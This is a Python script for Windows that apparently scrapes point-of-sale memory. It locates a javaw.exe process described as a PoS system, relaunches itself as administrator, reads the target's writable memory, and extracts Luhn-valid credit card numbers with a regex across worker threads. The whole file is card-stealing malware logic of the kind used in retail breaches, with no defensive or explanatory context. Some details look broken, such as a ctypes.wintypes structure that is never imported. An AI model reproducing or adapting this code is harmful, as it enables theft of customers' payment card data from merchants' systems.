import psutil
import ctypes
import re
import threading
from queue import Queue
import sys

# Constants for process access
PROCESS_VM_READ = 0x0010
PROCESS_QUERY_INFORMATION = 0x0400

# Queue for memory regions to scan (for threading)
memory_queue = Queue()

# Luhn's algorithm to validate credit card numbers
def validate_luhn(card_number):
    total = 0
    reverse_digits = card_number[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

# Credit card pattern using regex (adjust for specific PoS system)
cc_regex = re.compile(r'\b(?:\d[ -]*?){13,19}\b')

# Scan a buffer for potential credit card data
def scan_memory_chunk(memory_chunk):
    matches = cc_regex.findall(memory_chunk)
    valid_cards = []
    for match in matches:
        sanitized = re.sub(r'[^\d]', '', match)  # Remove non-numeric characters
        if validate_luhn(sanitized):  # Only return valid Luhn credit cards
            valid_cards.append(sanitized)
    return valid_cards

# Worker thread that processes memory chunks
def memory_scan_worker(process_handle):
    while not memory_queue.empty():
        base_addr, size = memory_queue.get()
        try:
            buffer = ctypes.create_string_buffer(size)
            bytesRead = ctypes.c_size_t(0)
            if ctypes.windll.kernel32.ReadProcessMemory(process_handle, ctypes.c_void_p(base_addr), buffer, size, ctypes.byref(bytesRead)):
                valid_cards = scan_memory_chunk(buffer.raw.decode('latin-1'))
                if valid_cards:
                    print(f"Found valid card(s) at address {base_addr}: {valid_cards}")
        except Exception as e:
            # Handle exceptions (e.g., access violations, decoding errors)
            print(f"Error reading memory at {base_addr}: {e}")
        finally:
            memory_queue.task_done()

# Get memory regions to scan (only committed, readable regions)
def get_memory_regions(pid):
    process = psutil.Process(pid)
    with process.oneshot():
        handle = ctypes.windll.kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
        if not handle:
            raise Exception(f"Failed to open process {pid}")

        memory_regions = []
        address = 0
        mbi = ctypes.wintypes.MEMORY_BASIC_INFORMATION()

        while ctypes.windll.kernel32.VirtualQueryEx(handle, ctypes.c_void_p(address), ctypes.byref(mbi), ctypes.sizeof(mbi)):
            if mbi.State == 0x1000 and mbi.Protect == 0x04:  # MEM_COMMIT and PAGE_READWRITE
                memory_regions.append((mbi.BaseAddress, mbi.RegionSize))
            address += mbi.RegionSize

        ctypes.windll.kernel32.CloseHandle(handle)
        return memory_regions

# Main function to scan memory of target process
def scan_process_memory(pid, num_threads=4):
    # Get memory regions
    memory_regions = get_memory_regions(pid)
    if not memory_regions:
        print(f"No valid memory regions found for PID {pid}")
        return

    # Add regions to queue
    for region in memory_regions:
        memory_queue.put(region)

    # Open process for reading
    process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)

    # Create and start worker threads
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=memory_scan_worker, args=(process_handle,))
        t.start()
        threads.append(t)

    # Wait for the queue to be processed
    memory_queue.join()

    # Clean up threads and process handle
    for t in threads:
        t.join()
    ctypes.windll.kernel32.CloseHandle(process_handle)

def is_admin():
    """
    Check if the script is running with administrative privileges.
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if __name__ == "__main__":
    # Ensure the script is running as admin
    if not is_admin():
        print("Attempting to restart with admin privileges...")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)

    # Get PID of javaw.exe (adjust based on target PoS process)
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'javaw.exe':
            target_pid = proc.info['pid']
            print(f"Found javaw.exe with PID {target_pid}")
            scan_process_memory(target_pid)
            break
    else:
        print("javaw.exe not found!")
